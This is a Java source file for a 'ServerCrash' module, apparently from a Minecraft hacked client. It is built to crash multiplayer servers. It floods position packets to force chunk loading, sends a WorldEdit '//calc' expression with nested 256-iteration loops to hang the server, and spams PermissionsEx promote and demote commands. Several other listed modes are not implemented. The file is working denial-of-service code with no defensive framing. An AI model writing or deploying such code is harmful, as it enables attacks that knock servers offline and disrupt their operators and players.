package me.pm.lemon.module.modules.experimental;

import me.pm.lemon.event.EventTarget;
import me.pm.lemon.event.events.ReadPacketEvent;
import me.pm.lemon.event.events.TickEvent;
import me.pm.lemon.gui.testScreen.settings.*;
import me.pm.lemon.module.Category;
import me.pm.lemon.module.Colors;
import me.pm.lemon.module.Module;
import net.minecraft.network.packet.c2s.play.PlayerMoveC2SPacket;
import net.minecraft.network.packet.s2c.play.DisconnectS2CPacket;

import java.util.Random;

public class ServerCrash extends Module {
    public ServerCrash() {
        super("ServerCrash", Category.EXPERIMENTAL, "test", -1, Colors.EXPERIMENTAL,
                new SettingToggle("Auto-Off", true),
                new SettingMode("Mode","MassiveChunkLoading", "WorldEdit", "Pex", "CubeCraft", "AACNew", "AACOther", "AACOld")
        );
    }

    private int seconds = 0;
    private int tickCounter = 0;

    @EventTarget
    public void onTick(TickEvent event) {
        int mode = getSetting(1).asMode().mode;
        if(mode == 2) {
            this.setDisplayName("Server Crash \2477Pex");
            if(seconds == 2) {
                mc.player.sendChatMessage((new Random()).nextBoolean() ? "/pex promote a a" : "/pex demote a a");
                seconds = 0;
            }
        }
        tickCounter++;
        if(tickCounter > 20) {
            seconds++;
            tickCounter = 0;
        }
    }

    @Override
    public void onEnable() {
        int mode = getSetting(1).asMode().mode;
        if(mode == 0) {
            this.setDisplayName("Server Crash \2477ChunkLoading");
            for(double yPos = mc.player.getY(); yPos < 255.0D; yPos += 5.0D) {
                mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionOnly(mc.player.getX(), yPos, mc.player.getZ(), true));
            }

            for(int i = 0; i < 6685; i += 5) {
                mc.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionOnly(mc.player.getX() + (double)i, 255.0D, mc.player.getZ() + (double)i, true));
            }
        }
        if(mode == 1) {
            this.setDisplayName("Server Crash \2477WorldEdit");
            assert mc.player != null;
            mc.player.sendChatMessage("//calc for(i=0;i<256;i++){for(a=0;a<256;a++){for(b=0;b<256;b++){for(c=0;c<256;c++){}}}}");
        }
        super.onEnable();
    }

    @Override
    public void onDisable() {
        super.onDisable();
    }

    @EventTarget
    private void EventDisconnect(ReadPacketEvent event) {
        if (event.getPacket() instanceof DisconnectS2CPacket && getSetting(0).asToggle().state) setToggled(false);
    }
}
